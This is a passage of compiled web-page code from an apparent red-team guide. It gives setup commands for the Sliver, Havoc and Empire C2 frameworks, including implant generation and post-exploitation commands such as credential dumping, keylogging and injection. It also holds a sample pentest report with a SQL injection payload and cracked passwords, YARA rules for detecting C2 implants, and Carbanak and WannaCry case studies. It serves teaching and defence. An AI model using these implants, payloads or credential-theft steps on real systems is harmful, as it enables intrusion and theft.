        children: "┌──────────────┐       ┌──────────────┐       ┌──────────────┐\n│ Victim       │──────→│ Redirector   │──────→│ Team Server   │\n│ (Beacon)     │ HTTPS │ (Nginx)      │ HTTPS │ (C2)          │\n└──────────────┘       └──────────────┘       └──────┬───────┘\n                                                      │\n                                             ┌────────┴────────┐\n                                             │  Cobalt Strike  │\n                                             │  Client (GUI)   │\n                                             └─────────────────┘\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Key features:"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Beacon:"
        }), " HTTP/HTTPS/DNS/SMB payload"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Malleable C2:"
        }), " Customizable traffic profiles"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Aggressor Script:"
        }), " Automation in Sleep language"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Lateral Movement:"
        }), " psexec, winrm, wmi, ssh"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "SOCKS Proxy:"
        }), " Route traffic through beacon"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Pivoting:"
        }), " Port scanning, service enumeration"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Data Staging:"
        }), " Host files for download (exfil)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Reporting:"
        }), " Activity report, IOC extraction"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Sliver C2 Setup:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Install Sliver\ncurl https://sliver.sh/install | sudo bash\n# Or build from source\ngit clone https://github.com/BishopFox/sliver.git\ncd sliver\nmake\n\n# Start server\nsliver-server\n\n# In Sliver server console:\nsliver-server > operators\nsliver-server > new-operator --name pentester --lhost 10.10.10.5\n# [+] Saved new operator config to: /root/.sliver-client/configs/pentester_10.10.10.5.cfg\n\n# Connect client\nsliver-client import /root/.sliver-client/configs/pentester_10.10.10.5.cfg\nsliver-client\n\n# HTTP listener\nsliver > http --domain acme.com -L 10.10.10.5 -l 443\n\n# Generate implant\nsliver > generate --http acme.com --os windows --arch amd64 --name win-update\n# [*] Generating implant, please wait...\n# [*] Implant saved to: /root/sliver/win-update.exe\n\nsliver > generate --mtls c2.acme.com --os linux --arch amd64 --name linux-agent\n# [*] Implant saved to: /root/sliver/linux-agent\n\n# List active sessions\nsliver > sessions\n\n# Interact with session\nsliver > use 1a2b3c4d5e\n\n# Post-exploitation commands\nsliver (win-update) > info\nsliver (win-update) > shell\nsliver (win-update) > ls C:\\Users\\Administrator\\\nsliver (win-update) > ps\nsliver (win-update) > execute-assembly /root/tools/Seatbelt.exe\nsliver (win-update) > sideload /root/tools/Rubeus.exe\nsliver (win-update) > migrate 1234\nsliver (win-update) > socks5 start\n\n# Set up pivot listeners\nsliver (win-update) > pivots tcp --bind 0.0.0.0:8443\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Havoc C2 Setup:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Clone and build\ngit clone https://github.com/HavocFramework/Havoc.git\ncd Havoc\nmake\n\n# Configure teamserver\ncat > teamserver.yaml << 'EOF'\nTeamserver:\n  Host: 0.0.0.0\n  Port: 40056\n  Authentication:\n    Username: admin\n    Password: changeme\n  Database:\n    Type: SQLite\n    Path: ./data/havoc.db\nEOF\n\n# Start teamserver\n./havoc server --profile ./teamserver.yaml\n\n# In another terminal, start client\n# Havoc client is a Qt app\n# configure listener via GUI\n\n# Demon implant commands:\n# sleep <seconds>\n# sleep 30\n# load <extension.dll>\n# inject <pid>\n# socks 1080\n# screenshot\n# keylog\n# hashdump\n# netstat\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Empire:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Install\ngit clone https://github.com/BC-SECURITY/Empire.git\ncd Empire\nsudo ./setup/install.sh\n\n# Start\nsudo empire\n\n# In Empire console:\n(Empire) > listeners\n\n# HTTP listener\n(Empire) > uselistener http\n(Empire: listeners/http) > set Host http://10.10.10.5:8080\n(Empire: listeners/http) > set Port 8080\n(Empire: listeners/http) > execute\n\n# Generate launcher\n(Empire) > usestager windows/launcher_bat\n(Empire: stager/windows/launcher_bat) > set Listener http\n(Empire: stager/windows/launcher_bat) > execute\n# Launcher bat file generated. Execute on target.\n\n# When agent calls back:\n(Empire) > agents\n(Empire) > interact ABC123\n\n# Modules\n(Empire: ABC123) > usemodule powershell/credentials/mimikatz/logonpasswords\n(Empire: ABC123) > execute\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "49-phase-8-reporting",
      children: "4.9 Phase 8: Reporting"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Full Report Template:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-markdown",
        children: "# PENETRATION TEST REPORT\n# Acme Corporation\n# Assessment Date: October 15 - November 15, 2024\n# Classification: CONFIDENTIAL\n\n---\n\n## 1. Executive Summary\n\n### Background\n\nAcme Corporation engaged SecurePentest LLC to perform an external penetration test\nof their production infrastructure to validate security controls and identify\nexploitable vulnerabilities.\n\n### Scope\n\n- External: *.acme.com, 203.0.113.0/24\n- Internal: 10.0.0.0/8\n- Web Applications: app.acme.com, api.acme.com, admin.acme.com\n\n### Overall Risk Rating: HIGH\n\n\n### Key Findings Summary\n\n| Severity | Count |\n|----------|-------|\n| Critical | 3     |\n| High     | 7     |\n| Medium   | 12    |\n| Low      | 18    |\n| Informational | 9 |\n| **Total** | **49** |\n\n### Critical Findings\n\n1. SQL Injection in /api/users endpoint (CVSS 9.8)\n   - Unauthenticated attacker can dump entire user database\n2. Domain Admin compromise via Pass-the-Hash (CVSS 9.1)\n   - Complete Active Directory domain compromise achieved\n3. Default credentials on Jenkins (CVSS 9.0)\n   - RCE as SYSTEM via Jenkins script console\n\n### Compromise Narrative\n\nThe assessment team achieved the following within the 4-week testing window:\n- Day 1: Reconnaissance identified 127 subdomains, 14 live hosts\n- Day 2: SQL injection found in API (Critical #1) → dumps 50K user records\n- Day 3: Extracted NTLM hashes from SQL Server (xp_cmdshell → secretsdump)\n- Day 4: Cracked service account → lateral movement to 3 servers\n- Day 5: Domain admin privileges obtained (Critical #2)\n- Day 6-10: Full AD compromise, 500GB data access, persistence established\n\n### Strategic Recommendations\n\n1. Implement Web Application Firewall (WAF) with SQLi rules\n2. Enable multi-factor authentication (MFA) for all external services\n3. Implement tiered administrative model (Tier 0/1/2)\n4. Deploy endpoint detection and response (EDR) across all servers\n5. Conduct quarterly vulnerability scans with remediation tracking\n6. Implement network segmentation between application tiers\n\n---\n\n## 2. Detailed Findings\n\n### Finding CRIT-001: SQL Injection in /api/users\n\n\n**Risk Rating:** Critical\n**CVSS Score:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)\n\n**Description:**\nThe /api/users endpoint concatenates user input directly into SQL queries\nwithout parameterization. An unauthenticated attacker can inject SQL commands\nto extract, modify, or delete database contents.\n\n**Affected Endpoint:**\nGET https://api.acme.com/api/users?id=1\n\n**Proof of Concept:**\n"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: ["Request:\nGET ", (0,jsx_runtime.jsx)(_components.a, {
        href: "https://api.acme.com/api/users?id=1",
        children: "https://api.acme.com/api/users?id=1"
      }), "' UNION SELECT @@version,user(),database()-- -"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Response:\n{\"version\":\"8.0.32\",\"user\":\"root@localhost\",\"database\":\"acme_db\"}"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "\n**Impact:**\n- Full database compromise (50k+ user records including PII)\n- Server compromise via xp_cmdshell (SQL Server) or INTO OUTFILE (MySQL)\n- Potential pivot to internal network\n\n**Remediation:**\n1. Replace string concatenation with parameterized queries\n2. Implement prepared statements in all database interactions\n3. Apply principle of least privilege to database account\n4. Implement input validation for all API parameters\n\n---\n\n### Finding CRIT-002: Domain Admin Compromise\n\n\n**Risk Rating:** Critical\n**CVSS Score:** 9.1 (CVSS:3.1/AV:L/AC:L/PR:H/UI:R/S:C/C:H/I:H/A:H)\n\n**Description:**\nAfter compromising a domain-joined SQL server, the team extracted NTLM hashes\nfrom LSASS and used pass-the-hash to authenticate as Domain Administrator.\n\n**Attack Chain:**\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "SQL Server (MSSQL Service)\n→ xp_cmdshell → OS command execution\n→ impacket-secretsdump → NTLM hash extraction\n→ CrackMapExec → Pass-the-Hash against Domain Controller\n→ Domain Admin access achieved"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "\n**Impact:**\n- Complete Active Directory domain compromise\n- Ability to reset any user password, modify group memberships\n- Golden Ticket creation for persistent access\n\n**Remediation:**\n1. Enable Windows Defender Credential Guard\n2. Disable xp_cmdshell on SQL Server instances\n3. Implement LAPS for local administrator password management\n4. Deploy EDR with LSASS protection enabled\n\n---\n\n## 3. Tool Outputs\n\n### Nmap Scan Results\n\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Nmap scan report for mail.acme.com (203.0.113.10)\nHost is up (0.045s latency)."
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "PORT     STATE    SERVICE    VERSION\n22/tcp   open     ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4\n25/tcp   open     smtp       Postfix smtpd\n80/tcp   open     http       Apache httpd 2.4.54\n443/tcp  open     ssl/http   Apache httpd 2.4.54\n110/tcp  open     pop3       Dovecot pop3d\n143/tcp  open     imap       Dovecot imapd\n993/tcp  open     ssl/imap   Dovecot imapd\n3306/tcp filtered mysql\n8080/tcp open     http-proxy Squid http proxy 5.7"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Service detection performed. Please report any incorrect results."
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "\n### Cracked Password Hashes\n\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "User: Administrator (Domain Admin)\nHash: fc525c9683e8fe067095ba2ddc971889\nPassword: P@ssw0rd2024! (via rockyou.txt + rules)\nTime to Crack: 3 minutes 42 seconds"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "User: sql_svc (Service Account)\nHash: e19ccf75ee54e06b06a5907af13cef42\nPassword: Spring2023! (in password spray list)\nTime to Crack: Immediate (password spray hit)"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "\n---\n\n## Appendix A: Risk Ratings Legend\n\n| Rating | Score | Definition |\n|--------|-------|------------|\n| Critical | 9.0-10.0 | Immediate exploitation likely. Direct access to sensitive data or systems. |\n| High | 7.0-8.9 | Exploitation possible. Significant data exposure or system access. |\n| Medium | 4.0-6.9 | Exploitation requires conditions. Limited data exposure. |\n| Low | 0.1-3.9 | Exploitation theoretical or requires extensive conditions. |\n| Informational | N/A | General security observations without direct risk. |\n\n## Appendix B: Methodology\n\nThis assessment followed the Penetration Testing Execution Standard (PTES) and\nOWASP Testing Guide v4.2. The testing methodology included:\n- Passive and active reconnaissance\n- Automated vulnerability scanning (Nessus, Nuclei)\n- Manual exploitation and verification\n- Privilege escalation testing\n- Lateral movement assessment\n- Password analysis and credential testing\n\n## Appendix C: Remediation Priority Matrix\n\n| Priority | Timeline | Definition |\n|----------|----------|------------|\n| Immediate | Within 24 hours | Active exploitation risk. Close attack vector immediately. |\n| Short-term | Within 1 week | High risk findings with known exploitation methods. |\n| Medium-term | Within 1 month | Medium risk findings requiring planning. |\n| Long-term | Within 3 months | Low risk findings. Implement as part of regular hardening. |\n\n## Appendix D: Tools Used\n\n- Nmap 7.94 (network scanning)\n- Burp Suite Professional 2024.10 (web testing)\n- Metasploit Framework 6.4 (exploitation)\n- CrackMapExec 6.0 (windows lateral movement)\n- Impacket v0.12 (AD tooling)\n- Hashcat 6.2.6 (password cracking)\n- Nuclei 3.2 (vulnerability scanning)\n- Gobuster 3.6 (directory enumeration)\n- Netcat 1.226 (bind/reverse shells)\n- Dradis 4.12 (reporting)\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "410-custom-yara-rule-for-c2-detection",
      children: "4.10 Custom YARA Rule for C2 Detection"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-yara",
        children: "/*\nCustom YARA rule to detect common C2 frameworks\nCan be deployed on EDR, custom scanners, or file integrity monitoring\n*/\nrule CobaltStrike_Beacon_HTTPS {\n    meta:\n        description = \"Detects Cobalt Strike HTTPS beacon artifacts\"\n        author = \"Pentest Team\"\n        date = \"2024-10-15\"\n        reference = \"Internal threat intelligence\"\n        hash = \"https://github.com/offensive-security/cobaltstrike-artifacts\"\n    strings:\n        // Cobalt Strike default pipe names\n        $pipe1 = \"\\msagent_\" ascii wide\n        $pipe2 = \"\\moses_\" ascii wide\n        $pipe3 = \"\\postex_\" ascii wide\n        $pipe4 = \"\\status_\" ascii wide\n        \n        // Cobalt Strike default named pipes\n        $np1 = \"\\\\.\\pipe\\msagent_\" ascii wide\n        $np2 = \"\\\\.\\pipe\\moses_\" ascii wide\n        \n        // Cobalt Strike specific strings\n        $cs_ref1 = \"MSSE-\" wide\n        $cs_ref2 = \"ReflectiveLoader\" ascii\n        $cs_ref3 = \"This program cannot be run in DOS mode\" wide\n        \n        // Malleable C2 default headers\n        $header1 = \"Cookie: __cfduid=\" ascii\n        $header2 = \"Cookie: PHPSESSID=\" ascii\n        \n    condition:\n        any of ($pipe*) or 2 of ($np*) or\n        ($cs_ref2 and $cs_ref3 and filesize < 500KB)\n}\n\nrule Sliver_Implant_Detection {\n    meta:\n        description = \"Detects Sliver C2 implant characteristics\"\n        author = \"Pentest Team\"\n        date = \"2024-10-15\"\n    strings:\n        // Sliver specific strings\n        $sl1 = \"sliver\" ascii wide nocase\n        $sl2 = \"beacon\" ascii wide nocase\n        $sl3 = \"implant_name\" ascii\n        $sl4 = \"mtls\" ascii\n        $sl5 = \"http-c2\" ascii\n        \n        // Sliver configuration strings\n        $cfg1 = \"reconnect_interval\" ascii\n        $cfg2 = \"max_errors\" ascii\n        $cfg3 = \"keys_exchange_interval\" ascii\n        \n        // Sliver specific function names\n        $func1 = \"CreateBeacon\" ascii\n        $func2 = \"ExecuteAssembly\" ascii\n        $func3 = \"SideloadAssembly\" ascii\n        \n    condition:\n        (3 of ($sl*) and filesize < 2MB) or\n        ($cfg1 and $cfg2) or\n        ($func1 and $func2)\n}\n\nrule Havoc_Demon_Implant {\n    meta:\n        description = \"Detects Havoc C2 Demon implant\"\n        author = \"Pentest Team\"\n        date = \"2024-10-15\"\n    strings:\n        // Havoc Demon specific\n        $havoc1 = \"Demon\" ascii wide\n        $havoc2 = \"Havoc\" ascii wide nocase\n        $havoc3 = \"SleepObf\" ascii\n        $havoc4 = \"IndirectSyscall\" ascii\n        $havoc5 = \"StackDuplic\" ascii\n        \n        // Havoc configuration\n        $hcfg1 = \"killdate\" ascii\n        $hcfg2 = \"working_dir\" ascii\n        $hcfg3 = \"injected_cmd\" ascii\n        \n        // Havoc encryption artifacts\n        $enc1 = \"aes_256_cbc\" ascii\n        $enc2 = \"chacha20\" ascii\n        \n    condition:\n        (2 of ($havoc*) and 2 of ($hcfg*)) or\n        (3 of ($havoc*) and filesize < 1MB)\n}\n\nrule Empire_Agent_PowerShell {\n    meta:\n        description = \"Detects Empire PowerShell agent artifacts\"\n        author = \"Pentest Team\"\n        date = \"2024-10-15\"\n    strings:\n        // Empire Agent strings\n        $emp1 = \"$agent_id\" ascii\n        $emp2 = \"$agent_name\" ascii\n        $emp3 = \"$working_key\" ascii\n        $emp4 = \"$encryption_key\" ascii\n        $emp5 = \"Invoke-Empire\" ascii\n        \n        // Empire communication\n        $comm1 = \"/admin/get.php\" ascii\n        $comm2 = \"/admin/login/process.php\" ascii\n        $comm3 = \"/news.php\" ascii\n        \n        // Empire tasking\n        $task1 = \"SYSTEM_STARTUP\" ascii\n        $task2 = \"TASK_CMD_WAIT\" ascii\n        $task3 = \"TASK_SHELL\" ascii\n        \n    condition:\n        (2 of ($emp*) and 2 of ($comm*)) or\n        (3 of ($emp*)) or\n        ($task1 and $task2 and filesize < 100KB)\n}\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "section-5-case-studies",
      children: "Section 5: Case Studies"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "case-study-1-carbanakfin7--1b-bank-heist",
      children: "Case Study 1: Carbanak/Fin7 — $1B+ Bank Heist"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Overview:"
      }), "\nCarbanak (also known as FIN7, the Carbanak Group) was a Russian-speaking cybercriminal group that stole over $1 billion from 100+ financial institutions across 40+ countries between 2013-2018. They are one of the most sophisticated financial cybercrime groups ever tracked."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "TTP Breakdown:"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "ATT&CK Tactic"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Technique"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Implementation"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Initial Access"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Spear-phishing"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Posed as legitimate banks, sent malicious Excel documents with macros"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Execution"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "User Execution"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Malicious macro executed PowerShell download cradle"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Persistence"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Registry Run Keys"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Cobalt Strike beacon configured for auto-start"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Defense Evasion"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Obfuscated Files"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Custom packers, encrypted payloads, process hollowing"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Credential Access"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Credential Dumping"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Mimikatz via Cobalt Strike to extract credentials"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Discovery"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "System Information Discovery"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Internal network reconnaissance, domain controller identification"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Lateral Movement"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Remote Services"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "CVE-2017-0199, PsExec, WMI"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Collection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Screen Capture"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Timed screenshots of money transfer interfaces"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Command & Control"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Cobalt Strike"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "HTTPS beacons with domain fronting"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Exfiltration"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Automated Exfiltration"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "FTP to compromised legitimate servers"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Impact"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Manipulate Financial Transactions"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Wire transfer manipulation, SWIFT system abuse"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Full Attack Chain:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Phase 1: Spear-phishing\n├── Email pretending to be from a legitimate partner bank\n├── Malicious RTF document with embedded exploit (CVE-2017-0199)\n└── Or: Excel document with malicious VBA macro\n\nPhase 2: Initial Foothold\n├── Macro executes PowerShell: powershell -NoP -NonI -W Hidden -Exec Bypass -Enc ...\n├── Cobalt Strike beacon DLL injected into explorer.exe\n└── Callback to C2 over HTTPS (port 443)\n\nPhase 3: Internal Recon\n├── BloodHound query: SharpHound.exe collection\n├── Domain admin account identified\n└── SQL servers, file servers, and domain controllers mapped\n\nPhase 4: Lateral Movement\n├── Pass-the-Hash using extracted credentials\n├── PsExec to deploy additional beacons\n└── Compromise banking application servers\n\nPhase 5: Cash-out\n├── Monitor SWIFT/ACH transactions via screen capture\n├── Implanted tools modified wire transfer amounts\n├── Transactions routed through mule accounts in multiple countries\n└── Funds withdrawn before fraud detection triggered\n\nPhase 6: Cleanup\n├── Deleted logs covering PowerShell and RDP connections\n├── Removed beacon from compromised systems\n└── Maintained secondary access through backup implants\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Tools Used:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Carbanak backdoor (custom malware with plugin architecture)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Cobalt Strike (post-2016 pivoted heavily)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Mimikatz"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "PsExec"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "PowerShell Empire"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Custom network scanning tools"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Detection and Mitigation:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Block macros by default (GPO: \"Block macros from running in Office files from the Internet\")"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Enable AMSI and PowerShell Script Block Logging"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Deploy EDR with behavioral detection (process hollowing, LSASS access)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Implement tiered administrative access"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "MFA for all financial transaction approvals"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "User behavior analytics for anomalous financial transactions"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Outcome:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Multiple arrests in 2018 (Ukraine, Spain, Germany)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Indictments by US DOJ (three primary members charged)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "$1B+ stolen across 100+ institutions"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Continues to operate in evolved form (as FIN7/Carbanak)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Members have been linked to ransomware operations (DarkSide, REvil)"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "case-study-2-marcus-hutchins-malwaretech--wannacry-kill-switch",
      children: "Case Study 2: Marcus Hutchins (MalwareTech) — WannaCry Kill Switch"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Overview:"
      }), "\nMarcus Hutchins, a British security researcher known as MalwareTech, accidentally discovered the kill switch for the WannaCry ransomware on May 12, 2017. This single action stopped the largest ransomware attack in history."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "The WannaCry Attack:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Date: May 12, 2017\nImpact: 230,000+ computers across 150 countries\nTotal Damage: $4B+ estimated\nVictims: NHS (UK's National Health Service), FedEx, Deutsche Bahn, Renault, Telefónica\nExploit: EternalBlue (NSA exploit leaked by Shadow Brokers)\nRansom: $300-$600 per computer in Bitcoin\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "The Sinkhole Discovery:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Marcus was analyzing WannaCry samples when he noticed the malware checked a specific domain:"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Domain checked: iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "His analysis (reconstructed):"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-python",
        children: "# WannaCry kill switch analysis\n# Marcus noticed the malware queries this domain before executing\n\nimport socket\nimport struct\n\ndef check_kill_switch(sample_hash):\n    # Disassemble sample -> found this URL hardcoded\n    kill_domain = \"iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com\"\n    \n    # If domain resolves -> malware exits\n    # If domain doesn't resolve -> malware encrypts\n    \n    try:\n        socket.gethostbyname(kill_domain)\n        print(\"Domain resolves -> WILL NOT ENCRYPT\")\n        return False  # Kill switch active\n    except socket.gaierror:\n        print(\"Domain doesn't resolve -> WILL ENCRYPT\")\n        return True   # Kill switch inactive\n\n# He registered the domain (already registered: iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com)\n# Pointed it to a sinkhole server\n# Every infected machine that checked this domain found it resolving -> refused to encrypt\n\n# Global impact:\n# Before registration: 1000s infected per hour\n# After registration: infections dropped to near zero\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "The Aftermath:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
